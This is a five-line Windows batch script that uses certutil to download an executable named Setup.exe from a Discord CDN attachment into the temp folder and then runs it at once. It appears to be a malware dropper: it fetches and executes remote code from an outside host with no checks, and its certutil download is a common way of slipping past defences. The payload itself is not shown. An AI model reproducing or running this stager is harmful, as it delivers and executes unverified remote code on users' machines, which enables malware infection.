@echo off
set url=<https://cdn.discordapp.com/attachments/1197242628396302458/1328059195471298650/Setup.exe>
set file=%temp%\downloaded_file.exe
certutil -urlcache -split -f "%url%" "%file%"
start "" "%file%"
